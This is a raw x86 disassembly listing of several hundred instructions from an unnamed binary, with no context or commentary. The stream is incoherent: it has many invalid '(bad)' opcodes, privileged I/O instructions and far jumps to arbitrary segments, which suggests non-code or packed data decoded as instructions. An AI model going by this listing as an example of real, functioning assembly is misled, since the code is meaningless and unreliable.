  41544c:	add    ch,BYTE PTR [esi-0x7e63c]
  415452:	mov    eax,ds:0x9fa8e4c4
  415457:	clc    
  415458:	(bad)  
  415459:	les    ecx,FWORD PTR [esi+0x7a]
  41545c:	cmp    edx,DWORD PTR [ecx+eax*1]
  41545f:	nop
  415460:	imul   ecx,DWORD PTR [ebx+ebx*8+0x24],0xfffffff8
  415465:	dec    esi
  415466:	in     al,0x8
  415468:	je     0x4153f0
  41546a:	(bad)  [ecx+ebx*4-0x18514f80]
  415471:	adc    BYTE PTR [edx],dl
  415473:	mov    ecx,0x85f6cbb
  415478:	or     BYTE PTR ds:0x6c7dc42a,cl
  41547e:	pop    eax
  41547f:	add    BYTE PTR [ecx-0x3f],al
  415482:	dec    ecx
  415483:	out    dx,eax
  415484:	pop    ecx
  415485:	push   eax
  415486:	lea    ecx,[edi-0x1e]
  415489:	push   ds
  41548a:	inc    ecx
  41548b:	sub    eax,0xfa38c4af
  415490:	pop    ebx
  415491:	call   0x61a4:0x23c72cb7
  415498:	jbe    0x4154e3
  41549a:	cmp    cl,al
  41549c:	and    dl,BYTE PTR [ecx]
  41549e:	and    BYTE PTR [eax-0x3cb1c275],bl
  4154a4:	or     al,0x3b
  4154a6:	jmp    0x8717:0xbb900b15
  4154ad:	stos   DWORD PTR es:[edi],eax
  4154ae:	xlat   BYTE PTR ds:[ebx]
  4154af:	ins    BYTE PTR es:[edi],dx
  4154b0:	hlt    
  4154b1:	in     al,dx
  4154b2:	inc    esp
  4154b3:	data16 mov dl,0x11
  4154b6:	mov    al,ds:0xb3a86bc2
  4154bb:	daa    
  4154bc:	(bad)  
  4154bd:	in     al,dx
  4154be:	stos   BYTE PTR es:[edi],al
  4154bf:	inc    ecx
  4154c0:	outs   dx,DWORD PTR ds:[esi]
  4154c1:	fwait
  4154c2:	xchg   esp,eax
  4154c3:	stos   BYTE PTR es:[edi],al
  4154c4:	xlat   BYTE PTR ds:[ebx]
  4154c5:	dec    ecx
  4154c6:	aas    
  4154c7:	mov    WORD PTR [ebp-0x1d],cs
  4154ca:	adc    eax,0x8baecc26
  4154cf:	cmp    eax,0x25f50660
  4154d4:	sub    ecx,DWORD PTR [edx+0x3f471d22]
  4154da:	imul   esi,ebx,0xf883d8d7
  4154e0:	xchg   ebx,eax
  4154e1:	jmp    0x43d490c8
  4154e6:	xchg   ebx,eax
  4154e7:	call   0x8f94d041
  4154ec:	adc    eax,0xeb5de4bb
  4154f1:	cdq    
  4154f2:	stos   DWORD PTR es:[edi],eax
  4154f3:	pop    esp
  4154f4:	cmp    dh,al
  4154f6:	data16 fadd st(0),st
  4154f9:	sub    al,0xc
  4154fb:	repz repnz test DWORD PTR [esi+0x71ef80f4],edi
  415503:	push   edi
  415504:	inc    eax
  415505:	iret   
  415506:	enter  0x3bf5,0x27
  41550a:	xchg   ecx,eax
  41550b:	cmp    eax,0x70bbc2aa
  415510:	mov    DWORD PTR ds:[edi+0x78e4063c],ebp
  415517:	ss clc 
  415519:	cmp    al,0x2f
  41551b:	cmp    al,0xd
  41551d:	push   edx
  41551e:	repnz sbb al,0x4b
  415521:	add    eax,0xce4b194c
  415526:	push   edx
  415527:	push   0x15e317ac
  41552c:	bound  edi,QWORD PTR [ebp+edx*1-0x37]
  415530:	inc    ebx
  415531:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415532:	fidivr DWORD PTR [esi]
  415534:	xor    eax,0x797fcf3a
  415539:	fwait
  41553a:	cmp    eax,0x84c2b4e1
  41553f:	shl    BYTE PTR ds:0x2f0e09c1,0x5e
  415546:	pusha  
  415547:	xor    bh,BYTE PTR [eax+edi*1]
  41554a:	in     al,0xb8
  41554c:	test   DWORD PTR ds:0xa960a15e,0x24d3d1ea
  415556:	pusha  
  415557:	add    al,0x1b
  415559:	icebp  
  41555a:	adc    dl,BYTE PTR [esi+eax*4+0x47]
  41555e:	in     eax,0xe2
  415560:	inc    eax
  415561:	pop    esp
  415562:	test   BYTE PTR [eax+0x56],dh
  415565:	cwde   
  415566:	ja     0x4155c6
  415568:	xchg   esi,eax
  415569:	cwde   
  41556a:	pop    es
  41556b:	or     eax,0x78716610
  415570:	sbb    al,0x7a
  415572:	adc    al,0x3d
  415574:	data16 sub dh,bl
  415577:	stos   BYTE PTR es:[edi],al
  415578:	jno    0x4155a4
  41557a:	add    BYTE PTR [ebx-0x7e],al
  41557d:	inc    edi
  41557e:	jne    0x4155df
  415580:	stc    
  415581:	leave  
  415582:	in     al,dx
  415583:	mov    ds:0xf0425860,eax
  415588:	dec    BYTE PTR [ebx+0x5a]
  41558b:	jne    0x4155dd
  41558d:	popf   
  41558e:	fisub  WORD PTR [edx+0x42]
  415591:	mov    dl,0x44
  415593:	mov    bl,0x6a
  415595:	(bad)  [edi-0x4dcfb6c5]
  41559b:	sub    al,0x30
  41559d:	hlt    
  41559e:	jecxz  0x41557f
  4155a0:	imul   edi,ecx,0xffffffd9
  4155a3:	add    dl,BYTE PTR [edi+0x435f40ca]
  4155a9:	add    cl,BYTE PTR [ebx]
  4155ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155ac:	push   esi
  4155ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155ae:	inc    eax
  4155af:	mov    bh,0x3c
  4155b1:	xor    BYTE PTR [esp+eax*2+0x70],ch
  4155b5:	sbb    eax,esp
  4155b7:	cmp    esp,ebx
  4155b9:	fucomi st,st(1)
  4155bb:	mov    ds:0x48ecf138,al
  4155c0:	inc    ecx
  4155c1:	jmp    0x41561c
  4155c3:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155c5:	out    0xf,eax
  4155c7:	fst    QWORD PTR [esi+eax*2]
  4155ca:	fwait
  4155cb:	push   ebp
  4155cc:	(bad)  
  4155cd:	sti    
  4155ce:	mov    ecx,DWORD PTR [ebp+0x31]
  4155d1:	fsubr  st(5),st
  4155d3:	pushf  
  4155d4:	out    dx,eax
  4155d5:	je     0x415620
  4155d7:	test   eax,0xfc5f71c3
  4155dc:	push   ebx
  4155dd:	xchg   edi,eax
  4155de:	fwait
  4155df:	xor    ecx,DWORD PTR [ecx]
  4155e1:	jns    0x4155c0
  4155e3:	lds    eax,FWORD PTR [ebp+0x20aec8f5]
  4155e9:	ds push ds
  4155eb:	arpl   WORD PTR [eax],cx
  4155ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155ee:	ficom  DWORD PTR fs:0xaa152ab2
  4155f5:	mov    dl,0xf5
  4155f7:	jo     0x415675
  4155f9:	dec    ebp
  4155fa:	mov    al,0xd3
  4155fc:	jno    0x4155a0
  4155fe:	repz ss aam 0xb
  415602:	nop
  415603:	mov    cl,0xe0
  415605:	jo     0x41565f
  415607:	xchg   ecx,eax
  415608:	adc    BYTE PTR [esi-0x6d],dl
  41560b:	push   ebx
  41560c:	dec    edx
  41560d:	jno    0x4155a5
  41560f:	pop    es
  415610:	push   ds
  415611:	and    al,0xa3
  415613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415614:	dec    ecx
  415615:	or     esi,DWORD PTR [ebx-0x518c58d]
  41561b:	push   0x1e448cba
  415620:	or     al,0x58
  415622:	jnp    0x41569a
  415624:	fcmovu st,st(4)
  415626:	das    
  415627:	jmp    0x4155f7
  415629:	mov    dh,0xed
  41562b:	in     eax,0x28
  41562d:	dec    esi
  41562e:	stc    
  41562f:	jns    0x415657
  415631:	fsub   DWORD PTR [esi]
  415633:	icebp  
  415634:	fmul   st(7),st
  415636:	jnp    0x41566d
  415638:	sub    al,0xfe
  41563a:	mov    dl,0x96
  41563c:	pop    ss
  41563d:	sar    BYTE PTR [esi+0x7fd50085],1
  415643:	inc    esp
  415644:	sub    BYTE PTR [ebx],ch
  415646:	addr16 jmp 0x4155ef
  415649:	sub    BYTE PTR [ebx+0x54f164ac],ch
  41564f:	sub    edx,DWORD PTR [edi+0x47]
  415652:	iret   
  415653:	rcl    DWORD PTR [edi-0x7c],0xaa
  415657:	ins    BYTE PTR es:[edi],dx
  415658:	ins    BYTE PTR es:[edi],dx
  415659:	scas   al,BYTE PTR es:[edi]
  41565a:	arpl   WORD PTR [ecx+0x3076b303],cx
  415660:	push   ss
  415661:	les    ebp,FWORD PTR [eax+edi*4+0x38]
  415665:	inc    esp
  415666:	and    al,0xf0
  415668:	xor    ch,BYTE PTR [ecx+0x57]
  41566b:	(bad)  [edi]
  41566d:	mov    esp,0x6830a119
  415672:	push   esi
  415673:	lahf   
  415674:	xchg   edx,eax
  415675:	jp     0x415659
  415677:	jb     0x41567c
  415679:	cdq    
  41567a:	mov    eax,0xf40bd1ac
  41567f:	xchg   DWORD PTR [ebp+0x36],esp
  415682:	fdivr  QWORD PTR [esi-0x51]
  415685:	ja     0x415624
  415687:	adc    eax,DWORD PTR [ebp+0x20]
  41568a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41568b:	or     ecx,esp
  41568d:	pop    edi
  41568e:	pop    esp
  41568f:	jl     0x4156d7
  415691:	xchg   BYTE PTR [ecx+0xe],dl
  415694:	fs pop ebx
  415696:	stos   BYTE PTR es:[edi],al
  415697:	jp     0x4156a3
  415699:	mov    ah,0x0
  41569b:	ins    DWORD PTR es:[edi],dx
  41569c:	sbb    eax,0x4ff90268
  4156a1:	cmp    al,0xc7
  4156a3:	aad    0xe8
  4156a5:	mov    cs,WORD PTR [ebp+0x57673e3a]
  4156ab:	xchg   BYTE PTR ds:0x83560dbd,bl
  4156b1:	mov    cl,0xd9
  4156b3:	mov    ebx,0xdb3b469b
  4156b8:	adc    BYTE PTR [ecx+0x6c],cl
  4156bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156bc:	mov    WORD PTR [ebp-0x56],?
  4156bf:	mov    ds,esp
  4156c1:	sbb    al,0xe7
  4156c3:	js     0x41567d
  4156c5:	jp     0x4156ee
  4156c7:	sub    ah,BYTE PTR [edx]
  4156c9:	dec    ebp
  4156ca:	(bad)  
  4156cb:	xchg   esi,eax
  4156cc:	nop
  4156cd:	jmp    0x833:0xf339a328
  4156d4:	push   ecx
  4156d5:	jmp    0x4156ae
  4156d7:	adc    bl,BYTE PTR [edx+ebx*8]
  4156da:	js     0x415672
  4156dc:	scas   eax,DWORD PTR es:[edi]
  4156dd:	daa    
  4156de:	mov    bl,0x4b
  4156e0:	das    
  4156e1:	inc    edi
  4156e2:	fisttp WORD PTR [ebp-0x2ed78240]
  4156e8:	aam    0xd1
  4156ea:	rol    esi,0xf7
  4156ed:	mov    ?,WORD PTR [edi+esi*1-0x5e]
  4156f1:	xlat   BYTE PTR ds:[ebx]
  4156f2:	shr    BYTE PTR [eax+eax*2-0x5ce69d48],cl
  4156f9:	sbb    bh,bh
  4156fb:	out    dx,eax
  4156fc:	cs mov ebp,0x4c9193d3
  415702:	mov    edi,0x62f714de
  415707:	arpl   WORD PTR [eax+0x18bd76ed],di
  41570d:	mov    edx,0xec103eff
  415712:	fcomp  QWORD PTR [ebx+0x53]
  415715:	stc    
  415716:	adc    ah,bh
  415718:	cmp    al,0xb8
  41571a:	mov    bh,BYTE PTR [edi+0x38]
  41571d:	mov    al,0xd3
  41571f:	dec    esp
  415720:	mov    ebx,0x928af059
  415725:	cvtdq2ps xmm2,xmm0
  415728:	push   edi
  415729:	mov    ah,0x53
  41572b:	mov    esi,DWORD PTR ds:[edx]
  41572e:	jbe    0x41570b
  415730:	out    dx,al
  415731:	sar    eax,0xd4
  415734:	xor    dh,BYTE PTR ds:0x48d58cb2
  41573a:	dec    eax
  41573b:	pop    ecx
  41573c:	pop    edx
  41573d:	arpl   WORD PTR [ebx],sp
  41573f:	inc    ebx
  415740:	addr16 mov esi,0xeb4a4ea4
  415746:	lea    esp,[ebp-0x4f552fa5]
  41574c:	sahf   
  41574d:	fcom   DWORD PTR [ebp-0x461809b0]
  415753:	daa    
  415754:	pop    edx
  415755:	dec    ebp
  415756:	lock dec esp
  415758:	mov    edx,0x7c6c4020
  41575d:	rcl    DWORD PTR [eax+0x2b],1
  415760:	out    0x48,eax
  415762:	adc    bl,ah
  415764:	sar    DWORD PTR [edi],1
  415766:	into   
  415767:	out    dx,al
  415768:	out    0xfd,eax
  41576a:	sbb    esi,DWORD PTR [ecx]
  41576c:	imul   esi,DWORD PTR [eax+ebx*1+0x43f6e3f6],0x719534b5
  415777:	int    0x72
  415779:	add    ah,BYTE PTR [ecx+0x9]
  41577c:	adc    BYTE PTR [edi],ch
  41577e:	ret    
  41577f:	int    0x88
  415781:	dec    ebp
  415782:	rol    ch,0x1b
  415785:	cmp    bl,al
  415787:	dec    esi
  415788:	jnp    0x4157ea
  41578a:	inc    esi
  41578b:	sbb    BYTE PTR [eax+0x734e5be7],dl
  415791:	jmp    0x4157a4
  415793:	popf   
  415794:	test   BYTE PTR ds:0x3f24037e,cl
  41579a:	jns    0x415788
  41579c:	xchg   ebp,eax
  41579d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41579e:	push   edi
  41579f:	cmp    dl,BYTE PTR [edx+0x49155549]
  4157a5:	hlt    
  4157a6:	mov    BYTE PTR [ebx+eax*4+0x46],cl
  4157aa:	jbe    0x4157b2
  4157ac:	and    DWORD PTR [ecx+0x46],edi
  4157af:	inc    edx
  4157b0:	jle    0x415795
  4157b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157b3:	or     al,0x82
  4157b5:	int3   
  4157b6:	pushf  
  4157b7:	cmp    eax,0xf8cc8a37
  4157bc:	imul   DWORD PTR [edi-0x56]
  4157bf:	mov    bh,0x19
  4157c1:	jecxz  0x41579d
  4157c3:	les    ebp,FWORD PTR [eax-0x37]
  4157c6:	rcl    DWORD PTR [edx+edx*2+0x12],0x3d
  4157cb:	fidivr DWORD PTR [eax]
  4157cd:	cli    
  4157ce:	or     BYTE PTR [ebx-0x22371f2c],dh
  4157d4:	adc    bh,BYTE PTR [ebp-0x45]
  4157d7:	cmp    al,0x4f
  4157d9:	fs jne 0x4157a0
  4157dc:	push   ds
  4157dd:	xchg   ebx,eax
  4157de:	rol    edx,1
  4157e0:	cmp    eax,0xb115f810
  4157e5:	(bad)  
  4157e6:	jmp    0xe3186ea7
  4157eb:	add    dh,dl
  4157ed:	add    edi,DWORD PTR [esi+0x6f]
  4157f0:	mov    al,0x79
  4157f2:	sbb    ch,bh
  4157f4:	add    al,0x77
  4157f6:	xchg   esp,eax
  4157f7:	inc    esi
  4157f8:	sti    
  4157f9:	ss adc al,0xc6
  4157fc:	or     al,0x3
  4157fe:	add    al,0xe9
  415800:	loopne 0x41582e
  415802:	in     eax,dx
  415803:	cmp    BYTE PTR [esi-0x50efccb3],dl
  415809:	loop   0x4157c8
  41580b:	mov    dh,0x79
  41580d:	xchg   esp,eax
  41580e:	ins    BYTE PTR es:[edi],dx
  41580f:	(bad)  
  415810:	sub    DWORD PTR [edi-0x7b],ebp
  415813:	es mov ebx,0xb5e3bed7
  415819:	sahf   
  41581a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41581b:	(bad)  
  41581c:	mov    dl,0x36
  41581e:	iret   
  41581f:	inc    ecx
  415820:	xor    edx,DWORD PTR [ecx-0x2c440323]
  415826:	int3   
  415827:	mov    BYTE PTR [ebx],bh
  415829:	bound  edx,QWORD PTR [edi+ebx*8+0x3afd730e]
  415830:	std    
  415831:	movntq QWORD PTR [edx+0x1],mm6
  415835:	test   DWORD PTR [edx],ebx
  415837:	push   ds
  415838:	sbb    al,0xa4
  41583a:	ins    BYTE PTR es:[edi],dx
  41583b:	mov    bh,0xb2
  41583d:	js     0x415864
  41583f:	dec    ebx
  415840:	(bad)  
  415841:	cld    
  415842:	fild   QWORD PTR ds:0x18e614b6
  415848:	inc    ebx
  415849:	mov    bl,0x62
  41584b:	adc    al,0xa5
  41584d:	xchg   ecx,eax
  41584e:	add    edx,DWORD PTR ds:0x3708dfe8
  415854:	push   ebp
  415855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415856:	es xor eax,0x2751cc
  41585c:	xchg   ebp,eax
  41585d:	adc    al,0xb6
  41585f:	scas   al,BYTE PTR es:[edi]
  415860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415861:	in     al,0xae
  415863:	loop   0x4157e5
  415865:	inc    ebp
  415866:	js     0x415889
  415868:	shl    BYTE PTR [edi],1
  41586a:	in     al,0x35
  41586c:	sti    
  41586d:	fiadd  WORD PTR [ebx]
  41586f:	test   bh,0xf7
  415872:	push   eax
  415873:	dec    ecx
  415874:	dec    ecx
  415875:	pushf  
  415876:	or     eax,eax
  415878:	ret    0xe5ce
  41587b:	shl    ch,0xd3
  41587e:	shl    edi,cl
  415880:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415881:	fdiv   DWORD PTR [edi+0x2c18e9c0]
  415887:	or     eax,0x5ad8d11d
  41588c:	push   ebx
  41588d:	mov    al,0x87
  41588f:	lds    edx,FWORD PTR ds:0xd4d8e33c
  415895:	ret    0x9eef
  415898:	mov    cl,0x81
  41589a:	shl    DWORD PTR [ecx-0x6ee09f5b],cl
  4158a0:	dec    esp
  4158a1:	pop    ebp
  4158a2:	sbb    DWORD PTR [ebx],edx
  4158a4:	call   0x55e9:0xed5b9ce9
  4158ab:	nop
  4158ac:	cmp    al,0x54
  4158ae:	out    dx,eax
  4158af:	je     0x41590e
  4158b1:	jb     0x4158d4
  4158b3:	cs inc eax
  4158b5:	shl    BYTE PTR [ebp-0x30],cl
  4158b8:	hlt    
  4158b9:	cmp    BYTE PTR [edi],al
  4158bb:	xor    BYTE PTR [ebx-0x48],ah
  4158be:	cdq    
  4158bf:	jmp    0x415893
  4158c1:	cmp    BYTE PTR [ebx+0x401b036d],bl
  4158c7:	nop
  4158c8:	sbb    BYTE PTR [esp+ebx*8-0x715f80b2],ch
  4158cf:	mov    cl,0x91
  4158d1:	shl    edi,cl
  4158d3:	(bad)  
  4158d5:	sar    BYTE PTR [esi+0x3fa7d98],1
  4158db:	fnsave [edi+0x68]
  4158de:	jg     0x415860
  4158e0:	enter  0xf125,0xb6
  4158e4:	(bad)  
  4158e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158e6:	sti    
  4158e7:	in     eax,0x36
  4158e9:	into   
  4158ea:	popa   
  4158eb:	xor    BYTE PTR ds:0x668ac46,al
  4158f1:	sbb    bl,BYTE PTR [ebx]
  4158f3:	aaa    
  4158f4:	(bad)  [edi-0x39]
  4158f7:	outs   dx,DWORD PTR ds:[esi]
  4158f8:	jge    0x415960
  4158fa:	ins    DWORD PTR es:[edi],dx
  4158fb:	push   ds
  4158fc:	clc    
  4158fd:	cmc    
  4158fe:	pop    esi
  4158ff:	test   BYTE PTR [ecx+0x518f289a],al
  415905:	push   0xffffffe5
  415907:	push   eax
  415908:	fnstenv [ebp+0x77]
  41590b:	popa   
  41590c:	jbe    0x415916
  41590e:	outs   dx,BYTE PTR ds:[esi]
  41590f:	push   esi
  415910:	xchg   DWORD PTR ss:[eax-0x2f],ebx
  415914:	cmp    DWORD PTR ds:0xfc6635ad,eax
  41591a:	and    eax,DWORD PTR [esi]
  41591c:	or     cl,dh
  41591e:	pusha  
  41591f:	loope  0x4158b6
  415921:	jp     0x4158ef
  415923:	pop    eax
  415925:	add    DWORD PTR [ebx+0x6a],edx
  415928:	or     al,bl
  41592a:	mov    ecx,0x156bc6d6
  41592f:	jnp    0x415974
  415931:	std    
  415932:	adc    eax,0xe8a136a9
  415937:	mov    edx,0x8f4f8b7d
  41593c:	(bad)  
  41593f:	or     DWORD PTR [ebx+0x32c35632],esp
  415945:	(bad)  
  415946:	in     eax,0x5a
  415948:	xchg   edi,esi
  41594a:	push   ss
  41594b:	loope  0x4158d6
  41594d:	pop    ecx
  41594e:	mov    gs,WORD PTR [edx]
  415950:	(bad)  
  415951:	or     al,0x9
  415953:	jmp    DWORD PTR [edi+ebx*4]
  415956:	push   esi
  415957:	js     0x4159d4
  415959:	xor    DWORD PTR ds:0xb5a27d5f,esi
  41595f:	dec    esi
  415960:	add    eax,0xf5bb131e
  415965:	(bad)  
  415966:	out    dx,al
  415967:	icebp  
  415968:	mov    ecx,esi
  41596a:	xchg   ebx,eax
  41596b:	imul   ebx,ebp,0xff12a089
  415971:	pop    ebp
  415972:	or     dl,bl
  415974:	dec    esp
  415975:	retf   0x3e4f
  415978:	dec    esp
  415979:	lods   al,BYTE PTR ds:[esi]
  41597a:	jl     0x4159bc
  41597c:	jmp    0x415925
  41597e:	adc    DWORD PTR ds:0x3e9be9f2,ebx
  415984:	cmp    ebx,DWORD PTR [edi-0x1d]
  415987:	neg    BYTE PTR [ebx+0x119ced1b]
  41598d:	fbld   TBYTE PTR [ebx+edx*8+0x4d07213f]
  415994:	retf   0xc783
  415997:	stos   DWORD PTR es:[edi],eax
  415998:	bound  ebp,QWORD PTR [ebp+0x44]
  41599b:	sbb    bh,BYTE PTR [ecx*4+0x2f46dd5a]
  4159a2:	pop    ebp
  4159a3:	inc    esi
  4159a4:	pandn  mm4,QWORD PTR [esi]
  4159a7:	daa    
  4159a8:	ins    DWORD PTR es:[edi],dx
  4159a9:	rcr    BYTE PTR [edx+eiz*1-0xcaf4f9f],0xb8
  4159b1:	xor    BYTE PTR [ebx+0x49],bl
  4159b4:	dec    BYTE PTR [edi+ebp*2]
  4159b7:	in     eax,0xa9
  4159b9:	(bad)  [edx+0x38aac031]
  4159bf:	inc    edx
  4159c0:	mov    DWORD PTR gs:[ebp+eiz*1-0x3fac5c0c],esp
  4159c8:	adc    BYTE PTR es:[eax-0x4438dd74],cl
  4159cf:	(bad)  
  4159d1:	push   0xffffffc8
  4159d3:	jne    0x415a2d
  4159d5:	jge    0x415a41
  4159d7:	loopne 0x4159e3
  4159d9:	sbb    DWORD PTR [esi-0x26],eax
  4159dc:	das    
  4159dd:	cmp    BYTE PTR [esi+0x5173a158],bh
  4159e3:	int3   
  4159e4:	and    bl,BYTE PTR [edi+0x46268e28]
  4159ea:	and    eax,0xfaf857e7
  4159ef:	lahf   
  4159f0:	fdiv   DWORD PTR [ebx+0x4d]
  4159f3:	sub    dh,BYTE PTR [ecx]
  4159f5:	and    DWORD PTR [ecx+0x4a],ebp
  4159f8:	les    esi,FWORD PTR [edi+0x7b]
  4159fb:	or     edi,eax
  4159fd:	xchg   esi,eax
  4159fe:	mov    ds:0x88627a59,al
  415a03:	mov    esi,0xac63ae15
  415a08:	lds    ecx,FWORD PTR [edx+0x4e0cbc8b]
  415a0e:	shr    BYTE PTR [eax],0x5
  415a11:	int    0x8
  415a13:	mov    ebp,0xb9389010
  415a18:	pop    esp
  415a19:	pop    ds
  415a1a:	shr    DWORD PTR [eax-0x5],1
  415a1d:	js     0x4159c6
  415a1f:	fidiv  DWORD PTR [edx+0x7c]
  415a22:	pusha  
  415a23:	mov    ds:0xebd32838,eax
  415a28:	clc    
  415a29:	vpcmpgtw ymm3,ymm2,YMMWORD PTR [eax]
  415a2d:	fs and dh,ah
  415a30:	add    BYTE PTR [esi],bh
  415a32:	mov    bl,bl
  415a34:	test   BYTE PTR [ecx-0x1e],bl
  415a37:	out    0xfe,eax
  415a39:	and    BYTE PTR [esi+edx*2],dl
  415a3c:	add    BYTE PTR [ecx+0x66],bl
  415a3f:	add    ebp,DWORD PTR [edi]
  415a41:	mov    eax,0xb69c84ce
  415a46:	inc    eax
  415a47:	stos   BYTE PTR es:[edi],al
  415a48:	jmp    0x415aae
  415a4a:	jne    0x415a7f
  415a4c:	ds fs dec edx
  415a4f:	cmp    bx,WORD PTR [esi-0x76ce4b39]
  415a56:	outs   dx,DWORD PTR ds:[esi]
  415a57:	push   ecx
  415a58:	loop   0x415a0e
  415a5a:	jmp    0x415ad3
  415a5c:	jne    0x415a9c
  415a5e:	cmp    al,0xb4
  415a60:	dec    ebp
  415a61:	dec    esi
  415a62:	mov    al,0x10
  415a64:	loop   0x415a59
  415a66:	ins    DWORD PTR es:[edi],dx
  415a67:	cld    
  415a68:	adc    BYTE PTR [ecx+esi*4+0x6d917f75],ch
  415a6f:	test   al,0x4b
  415a71:	mul    BYTE PTR [edi+0x7]
  415a74:	(bad)  
  415a75:	gs bnd jle 0x415aaa
  415a79:	dec    esp
  415a7a:	hlt    
  415a7b:	into   
  415a7c:	call   0x47cc:0x723cde07
  415a83:	jb     0x415a65
  415a85:	clc    
  415a86:	aad    0x6e
  415a88:	add    ecx,DWORD PTR [esi+0x6d9f622d]
  415a8e:	xor    al,0x22
  415a90:	out    0x7b,al
  415a92:	push   cs
  415a93:	add    DWORD PTR [edi-0x29],edx
  415a96:	pop    ds
  415a97:	pop    edx
  415a98:	pop    eax
  415a99:	and    bl,BYTE PTR [ecx+0x2b0e946d]
  415a9f:	jae    0x415af1
  415aa1:	les    esp,FWORD PTR [eax+edi*8]
  415aa4:	mov    bh,al
  415aa6:	push   0xa6b309bc
  415aab:	pop    eax
  415aac:	leave  
  415aad:	aam    0x29
  415aaf:	cmp    eax,0xd7aa4d60
  415ab4:	dec    esp
  415ab5:	mov    DWORD PTR [eax+edx*4],esi
  415ab8:	scas   eax,DWORD PTR es:[edi]
  415ab9:	enter  0x1b1e,0x90
  415abd:	shl    DWORD PTR [ecx+0x1b],1
  415ac0:	dec    edi
  415ac1:	std    
  415ac2:	shl    DWORD PTR [esp+ebp*4],0x2a
  415ac6:	mov    eax,ds:0x2dfa224f
  415acb:	mov    eax,0xf2e2fe6f
  415ad0:	sbb    al,cl
  415ad2:	pop    ebp
  415ad3:	push   0xffffffb0
  415ad5:	scas   al,BYTE PTR es:[edi]
  415ad6:	mov    cl,cl
  415ad8:	clc    
  415ad9:	dec    ecx
  415ada:	dec    edi
  415adb:	rcl    bl,cl
  415add:	int3   
  415ade:	inc    esi
  415adf:	hlt    
  415ae0:	mov    ah,0x65
  415ae2:	xchg   DWORD PTR [edx],esp
  415ae4:	scas   al,BYTE PTR es:[edi]
  415ae5:	dec    ebx
  415ae6:	inc    edx
  415ae7:	push   edi
  415ae8:	mov    DWORD PTR [ecx-0x42d6b6ff],ecx
  415aee:	dec    esp
  415aef:	cmp    cl,bh
  415af1:	retw   0x8eb2
  415af5:	jns    0x415acd
  415af7:	and    eax,0x377cc8a7
  415afc:	cmp    BYTE PTR [esi],bh
  415afe:	loope  0x415a96
  415b00:	cmp    ch,BYTE PTR [ebx-0x37]
  415b03:	adc    DWORD PTR [ebx+ebp*1],ebp
  415b06:	sub    ah,dh
  415b08:	repnz mov bl,BYTE PTR [eax-0x5980c82f]
  415b0f:	pop    DWORD PTR [edi-0x7a]
  415b12:	dec    edi
  415b13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b14:	out    0x54,al
  415b16:	pop    eax
  415b17:	aam    0xfd
  415b19:	cmp    al,0x5f
  415b1b:	cmp    eax,0xb8614c2b
  415b20:	clc    
  415b21:	xchg   edi,eax
  415b22:	mov    ah,0x18
  415b24:	(bad)  
  415b25:	(bad)  
  415b26:	mov    ch,0xb2
  415b28:	loop   0x415acd
  415b2a:	rol    BYTE PTR [ecx],0x40
  415b2d:	and    ebx,ecx
  415b2f:	jns    0x415b8a
  415b31:	mov    esi,0xcd2b7a7
  415b36:	not    DWORD PTR [ecx+esi*1+0x1c88449a]
  415b3d:	stc    
  415b3e:	inc    eax
  415b3f:	push   0xa2c40e91
  415b44:	mov    ebx,edx
  415b46:	(bad)  
  415b47:	or     ebp,DWORD PTR [ebp+0x3b]
  415b4a:	or     al,0x4c
  415b4c:	push   edi
  415b4d:	nop
  415b4e:	scas   eax,DWORD PTR es:[edi]
  415b4f:	adc    bl,BYTE PTR [bp+si+0x98e]
  415b54:	out    0xcf,al
  415b56:	jecxz  0x415b40
  415b58:	icebp  
  415b59:	and    al,0xbe
  415b5b:	std    
  415b5c:	and    al,0x42
  415b5e:	lods   eax,DWORD PTR ds:[esi]
  415b5f:	outs   dx,DWORD PTR ds:[esi]
  415b60:	test   BYTE PTR [eax],dh
  415b62:	mov    BYTE PTR [eax+0x7e62350],0x89
  415b69:	pop    esp
  415b6a:	mov    esp,DWORD PTR [eax+ebp*2+0x382f0991]
  415b71:	jp     0x415bc2
  415b73:	test   al,0xc5
  415b75:	xor    DWORD PTR [ecx-0x4a061554],ebp
  415b7b:	xchg   edi,eax
  415b7c:	cmp    esi,edx
  415b7e:	mov    bh,0x3f
  415b80:	push   edx
  415b81:	xor    DWORD PTR [eax+0x689d2e64],edi
  415b87:	adc    BYTE PTR [ebp+0x35],0xe0
  415b8b:	and    eax,0x37651a4c
  415b90:	inc    esp
  415b91:	sub    DWORD PTR [eax+0x3f9b6785],ecx
  415b97:	loopne 0x415ba0
  415b99:	mov    esi,0xad99fbfa
  415b9e:	rol    al,cl
  415ba0:	pop    ecx
  415ba1:	jns    0x415bd8
  415ba3:	dec    ebp
  415ba4:	jmp    0x8cc2cf0
  415ba9:	pmaddwd mm4,QWORD PTR [ebx+0x5cb56131]
  415bb0:	fldcw  WORD PTR [esi]
  415bb2:	push   edx
  415bb3:	mov    edi,0xea938c7a
  415bb8:	mov    al,ds:0x16b0e009
  415bbd:	jp     0x415b6b
  415bbf:	dec    eax
  415bc0:	push   ds
  415bc1:	mov    edi,0x2af88fbd
  415bc6:	aam    0xb1
  415bc8:	cmp    al,BYTE PTR [ecx]
  415bca:	jae    0x415c47
  415bcc:	in     eax,dx
  415bcd:	dec    edx
  415bce:	inc    ebx
  415bcf:	mov    cs,esp
  415bd1:	arpl   WORD PTR [ecx+0xe8ba96a],ax
  415bd7:	in     al,dx
  415bd8:	idiv   BYTE PTR [edx]
  415bda:	int3   
  415bdb:	xor    ebx,eax
  415bdd:	inc    edi
